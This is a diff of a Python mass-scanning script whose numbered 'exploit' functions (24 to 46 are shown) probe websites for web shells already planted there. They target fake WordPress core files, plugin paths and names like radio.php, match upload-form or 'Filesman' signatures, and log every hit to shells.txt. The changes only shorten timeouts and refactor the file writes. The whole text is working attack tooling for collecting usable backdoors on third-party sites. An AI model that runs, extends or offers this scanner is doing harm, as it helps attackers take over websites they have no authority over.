                 print ('[#] Exploit 23 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -547,17 +547,17 @@ def exploit_24(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=5)
         if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/db.php?u')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/seoplugins/db.php?u')
             else:
                 print ('[#] Exploit 24 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -568,17 +568,17 @@ def exploit_25(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,timeout=5)
         if ('<title>Upload files...</title>' in check.content.decode("utf-8")):
                 print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
+                write_to_file('shells.txt', url + '/index.php?3x=3x')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<title>Upload files...</title>' in check.content.decode("utf-8"):
                     print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
+                    write_to_file('shells.txt', url + '/index.php?3x=3x')
             else:
                 print ('[#] Exploit 25 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -589,17 +589,17 @@ def exploit_26(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<li class="form-upload">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/1.php\n')
+                write_to_file('shells.txt', url + '/1.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<li class="form-upload">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/1.php\n')
+                    write_to_file('shells.txt', url + '/1.php')
             else:
                 print ('[#] Exploit 26 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -610,17 +610,17 @@ def exploit_27(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/radio.php\n')
+                write_to_file('shells.txt', url + '/radio.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/radio.php\n')
+                    write_to_file('shells.txt', url + '/radio.php')
             else:
                 print ('[#] Exploit 27 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -631,17 +631,17 @@ def exploit_28(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/404.php\n')
+                write_to_file('shells.txt', url + '/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/404.php\n')
+                    write_to_file('shells.txt', url + '/404.php')
             else:
                 print ('[#] Exploit 28 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -652,17 +652,17 @@ def exploit_29(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=5)
         if ('ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'ioptimization <input type="submit" value="Upload">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk')
             else:
                 print ('[#] Exploit 29 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -673,17 +673,17 @@ def exploit_30(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=5)
         if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/pridmag/db.php?u')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/pridmag/db.php?u')
             else:
                 print ('[#] Exploit 30 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -701,17 +701,17 @@ def exploit_31(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/compat-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/compat-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 31 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/compat-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/compat-ajax-response.php')
             else:
                 print ('[#] Exploit 31 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -723,17 +723,17 @@ def exploit_32(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/feed-rss-meta.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/feed-rss-meta.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 32 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rss-meta.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/feed-rss-meta.php')
             else:
                 print ('[#] Exploit 32 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -745,17 +745,17 @@ def exploit_33(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/SimplePie/IRI-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/SimplePie/IRI-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 33 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/SimplePie/IRI-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/SimplePie/IRI-stream.php')
             else:
                 print ('[#] Exploit 33 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -767,17 +767,17 @@ def exploit_34(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-walker-page-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-walker-page-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 34 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-walker-page-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-walker-page-ajax-response.php')
             else:
                 print ('[#] Exploit 34 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -789,17 +789,17 @@ def exploit_35(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 35 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php')
             else:
                 print ('[#] Exploit 35 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -811,17 +811,17 @@ def exploit_36(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/https-detection-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 36 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/https-detection-ajax.php')
             else:
                 print ('[#] Exploit 36 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -833,17 +833,17 @@ def exploit_37(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 37 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php')
             else:
                 print ('[#] Exploit 37 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -855,17 +855,17 @@ def exploit_38(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-private.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 38 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-private.php')
             else:
                 print ('[#] Exploit 38 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -877,17 +877,17 @@ def exploit_39(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-simplepie-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-simplepie-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 39 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-simplepie-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-simplepie-ajax.php')
             else:
                 print ('[#] Exploit 39 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -899,17 +899,17 @@ def exploit_40(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-term-query-cron.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-term-query-cron.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 40 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-term-query-cron.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-term-query-cron.php')
             else:
                 print ('[#] Exploit 40 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -921,17 +921,17 @@ def exploit_41(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/feed-rdf-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/feed-rdf-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 41 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/feed-rdf-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/feed-rdf-stream.php')
             else:
                 print ('[#] Exploit 41 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -942,17 +942,17 @@ def exploit_42(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/class-wp-simplepie-sanitize-kses-stream.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 42 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/class-wp-simplepie-sanitize-kses-stream.php')
             else:
                 print ('[#] Exploit 42 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -963,17 +963,17 @@ def exploit_43(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/http-ajax-response.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/http-ajax-response.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 43 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/http-ajax-response.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/http-ajax-response.php')
             else:
                 print ('[#] Exploit 43 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -984,17 +984,17 @@ def exploit_44(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/customize/class-wp-customize-filter-setting-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 44 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-filter-setting-ajax.php')
             else:
                 print ('[#] Exploit 44 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1005,17 +1005,17 @@ def exploit_45(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/https-detection-ajax.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/https-detection-ajax.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="file" name="filename">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 45 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/https-detection-ajax.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/https-detection-ajax.php')
             else:
                 print ('[#] Exploit 45 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -1026,17 +1026,17 @@ def exploit_46(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/customize/class-wp-customize-header-image-control-stream.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="file" name="filename">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 46 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/customize/class-wp-customize-header-image-control-stream.php')
